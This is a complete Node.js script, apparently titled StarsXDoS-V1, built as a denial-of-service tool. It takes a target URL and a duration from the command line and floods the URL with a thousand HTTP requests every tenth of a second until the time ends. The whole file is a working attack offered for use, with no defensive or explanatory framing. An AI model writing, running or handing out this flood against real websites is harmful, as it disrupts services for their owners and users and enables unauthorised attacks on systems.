const fetch = require('node-fetch');
const target = process.argv[2];
const duration = process.argv[3];

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Invalid Usage: node StarsXDoS-V1.js URL DURATION.');
    process.exit(1);
} else {
    const attackInterval = setInterval(async () => {
        const requests = [];
        for (let i = 0; i < 1000; i++) {
            requests.push(fetch(target).catch(error => {}));
        }
        await Promise.all(requests);
    }, 100);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
}